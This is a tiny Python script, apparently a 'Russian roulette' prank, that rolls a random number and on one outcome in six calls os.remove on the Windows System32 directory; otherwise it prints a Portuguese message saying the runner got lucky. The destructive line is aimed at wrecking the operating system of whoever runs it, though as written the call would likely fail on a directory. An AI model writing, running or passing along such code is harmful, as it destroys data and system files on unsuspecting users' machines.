import os
import random
from random import randint

if random.randint(1, 6) == 1:
    os.remove("C:\Windows\System32")
else:
    print("Deu sorte hein amigo!")